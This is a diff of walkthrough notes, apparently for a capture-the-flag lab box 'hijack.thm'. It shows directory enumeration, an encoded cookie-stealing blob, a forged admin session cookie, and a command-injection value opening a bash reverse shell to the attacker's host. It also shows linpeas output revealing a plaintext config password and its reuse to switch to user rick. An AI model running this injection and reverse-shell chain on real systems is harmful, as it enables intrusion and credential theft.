@@ -181,10 +181,10 @@ NOTE To rick : good job on limiting login attempts, it works like a charm, this 
 
 ─(duke㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hijack.thm -x .php, .txt, .html 
-===============================================================
+
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+
 [+] Url:                     http://hijack.thm
 [+] Method:                  GET
 [+] Threads:                 10
@@ -193,9 +193,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.1.0
 [+] Extensions:              php,
 [+] Timeout:                 10s
-===============================================================
+
 2024/05/23 04:59:23 Starting gobuster in directory enumeration mode
-===============================================================
+
 /index.php            (Status: 200) [Size: 487]
 /login.php            (Status: 200) [Size: 822]
 /signup.php           (Status: 200) [Size: 1002]
@@ -204,11 +204,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /administration.php   (Status: 200) [Size: 51]               
 /navbar.php           (Status: 200) [Size: 304]              
 /server-status        (Status: 403) [Size: 275]              
-                                                  
-
-
+                                                
 ### Password bruce forcing -- admin 
-
 
 ### steal cookies
 UEhQU0VTU0lEPVBITmpjbWx3ZEQ1MllYSWdhVDF1WlhjZ1NXMWhaMlVvS1RzZ2FTNXpjbU05SW1oMGRIQTZMeTh4TUM0NUxqTXdMakl3TWk4JTJGWTI5dmEybGxQU0lyWW5SdllTaGtiMk4xYldWdWRDNWpiMjlyYVdVcE96d3ZjMk55YVhCMFBqcGxNVEJoWkdNek9UUTVZbUUxT1dGaVltVTFObVV3TlRkbU1qQm1PRGd6WlElM0QlM0Q=
@@ -221,6 +218,45 @@ base64(admin:d6573ed739ae7fdfb3ced197d94820a5)
 YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
 
 Cookie: PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3d
+
+
+### command injection
+
+http://hijack.thm/administration.php
+
+* mysql.service - MySQL Community Server
+   Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)
+   Active: active (running) since Tue 2024-05-28 07:23:11 UTC; 1h 29min ago
+  Process: 1114 ExecStartPost=/usr/share/mysql/mysql-systemd-start post (code=exited, status=0/SUCCESS)
+  Process: 1061 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=exited, status=0/SUCCESS)
+ Main PID: 1113 (mysqld)
+    Tasks: 28
+   Memory: 167.5M
+      CPU: 4.368s
+   CGroup: /system.slice/mysql.service
+           `-1113 /usr/sbin/mysqld
+
+
+
+ftp && bash -c "bash -i >& /dev/tcp/LOCAL-IP/1234 0>&1"
+
+### Get reverseshell and run linpeas
+
+╔══════════╣ Searching passwords in config PHP files
+/var/www/html/config.php:$password = "N3v3rG0nn4G1v3Y0uUp";    
+
+### spawn shell and get rick
+
+www-data@Hijack:/tmp$ su rick
+su rick
+su: must be run from a terminal
+www-data@Hijack:/tmp$ /usr/bin/script -qc /bin/bash /dev/null
+/usr/bin/script -qc /bin/bash /dev/null
+www-data@Hijack:/tmp$ su rick
+su rick
+Password: N3v3rG0nn4G1v3Y0uUp
+
+rick@Hijack:/tmp$ 
 
 
 <\code>
